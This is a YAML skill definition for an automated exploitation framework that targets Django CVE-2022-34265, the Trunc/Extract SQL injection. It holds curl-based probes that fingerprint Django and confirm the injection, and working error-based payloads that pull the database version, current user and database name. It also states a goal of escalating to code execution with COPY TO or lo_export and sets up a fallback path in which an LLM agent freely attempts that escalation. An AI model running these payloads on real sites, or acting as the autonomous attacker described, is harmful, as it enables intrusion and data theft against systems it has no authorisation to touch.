# ═══════════════════════════════════════════════════════════
# Django CVE-2022-34265 — Trunc/Extract SQL 注入  v4
#
# v4 改进:
#   - 报错确认不再直接 conclude_success（那只是检测，不是利用）
#   - 添加 error-based 数据提取步骤，证明可控数据泄露
#   - 尝试通过 COPY TO / lo_export 升级 RCE（PostgreSQL）
#   - 数据提取成功即 conclude_success（SQLi 利用完成）
# ═══════════════════════════════════════════════════════════
skill_id: django_sqli
name: "Django Trunc/Extract SQL 注入 (CVE-2022-34265)"
category: web_inject
version: "4.0"

principle: |
  Django Trunc()/Extract() 未过滤 kind 参数 → SQL 注入。
  注入上下文: DATE_TRUNC('kind', column)
  
  利用链:
  1. 确认注入: ?date=year' → ProgrammingError
  2. 数据提取: 用 CAST 错误泄露数据
     ?date=year' AND 1=CAST(version() AS INT)--
     → PostgreSQL 尝试将版本字符串转 INT → 报错包含版本信息
  3. RCE 尝试（需要高权限）:
     COPY ... TO 写文件 / lo_export

match:
  rules:
    - fingerprint_contains: ["django"]
    - fingerprint_contains: ["Django"]
    - evidence_contains: ["django"]
    - evidence_contains: ["ProgrammingError"]
    - cve_matches: ["CVE-2022-34265"]

probes:
  - id: confirm_django
    description: "确认 Django 框架"
    steps:
      - command: |
          curl -s -D - {ENDPOINT}/ --max-time 10 2>/dev/null
        parse_rules:
          - if_contains: ["django", "csrftoken", "csrfmiddlewaretoken", "Django"]
            set: { django_confirmed: true }

      - command: |
          curl -s {ENDPOINT}/nonexistent_xxx --max-time 10 2>/dev/null
        parse_rules:
          - if_contains: ["django", "Django", "Traceback"]
            set: { django_confirmed: true }

  - id: confirm_sqli
    description: "确认 SQL 注入点"
    depends_on: { django_confirmed: true }
    steps:
      - command: |
          resp=$(curl -s "{ENDPOINT}/?date=year%27" --max-time 15 2>/dev/null)
          if echo "$resp" | grep -qi "ProgrammingError\|OperationalError\|syntax error\|unterminated"; then
            echo "SQLI_CONFIRMED_date"
          fi
          resp2=$(curl -s "{ENDPOINT}/?kind=year%27" --max-time 15 2>/dev/null)
          if echo "$resp2" | grep -qi "ProgrammingError\|OperationalError\|syntax error\|unterminated"; then
            echo "SQLI_CONFIRMED_kind"
          fi
        parse_rules:
          - if_contains: ["SQLI_CONFIRMED_date"]
            set: { sqli_confirmed: true, sqli_param: "date" }
          - if_contains: ["SQLI_CONFIRMED_kind"]
            set: { sqli_confirmed: true, sqli_param: "kind" }

exploit_paths:
  # ═══ 路径 A: Error-based 数据提取（PostgreSQL）═══
  - path_id: error_based_extract
    name: "Error-based SQL 数据提取"
    priority: 1
    conditions:
      sqli_confirmed: true
    steps:
      - id: extract_version
        description: "用 CAST 错误提取数据库版本"
        command: |
          # 通过 CAST(version() AS INT) 触发类型转换错误
          # PostgreSQL 错误信息会包含 version() 的实际值
          PARAM="{sqli_param}"
          echo "=== 提取数据库版本 ==="
          resp=$(curl -s "{ENDPOINT}/?${PARAM}=year%27%20AND%201%3DCAST(version()%20AS%20INTEGER)--%20" --max-time 15 2>/dev/null)
          echo "$resp"
          if echo "$resp" | grep -qi "PostgreSQL\|invalid input syntax"; then
            echo ""
            echo "DJANGO_SQLI_DATA_EXTRACTED"
          fi
        timeout: 20
        success_criteria:
          stdout_contains_any:
            - "DJANGO_SQLI_DATA_EXTRACTED"
        on_success: extract_user
        on_fail: extract_version_alt

      - id: extract_version_alt
        description: "备用提取方式: 子查询注入"
        command: |
          PARAM="{sqli_param}"
          echo "=== 备用提取 ==="
          resp=$(curl -s "{ENDPOINT}/?${PARAM}=year%27%2C(SELECT%20version()))--%20" --max-time 15 2>/dev/null)
          echo "$resp"
          if echo "$resp" | grep -qi "PostgreSQL\|MySQL\|SQLite\|invalid\|error"; then
            echo "DJANGO_SQLI_DATA_EXTRACTED"
          fi
        timeout: 20
        success_criteria:
          stdout_contains_any:
            - "DJANGO_SQLI_DATA_EXTRACTED"
        on_success: extract_user
        on_fail: next_path

      - id: extract_user
        description: "提取当前数据库用户"
        command: |
          PARAM="{sqli_param}"
          echo "=== 提取当前用户 ==="
          resp=$(curl -s "{ENDPOINT}/?${PARAM}=year%27%20AND%201%3DCAST(current_user%20AS%20INTEGER)--%20" --max-time 15 2>/dev/null)
          echo "$resp"
          echo ""
          echo "=== 提取当前数据库名 ==="
          resp2=$(curl -s "{ENDPOINT}/?${PARAM}=year%27%20AND%201%3DCAST(current_database()%20AS%20INTEGER)--%20" --max-time 15 2>/dev/null)
          echo "$resp2"
          echo ""
          echo "DJANGO_SQLI_EXPLOIT_COMPLETE"
        timeout: 30
        success_criteria:
          stdout_contains_any:
            - "DJANGO_SQLI_EXPLOIT_COMPLETE"
        on_success: conclude_success
        on_fail: conclude_success
        evidence_capture:
          shell_type: "sqli_data_extraction"
          current_user: "stdout"

  # ═══ 路径 B: LLM 兜底（尝试 SQLi→RCE 升级）═══
  - path_id: llm_freeform
    name: "LLM 自由推理（尝试 SQLi→RCE 升级）"
    priority: 99
    mode: react_freeform
    max_rounds: 5
    conditions:
      django_confirmed: true

remediation: |
  1. 升级 Django 至 3.2.14 / 4.0.6 或更高版本
  2. 不要将用户输入直接传给 Trunc/Extract 的 kind 参数
  3. 使用参数化查询，避免拼接 SQL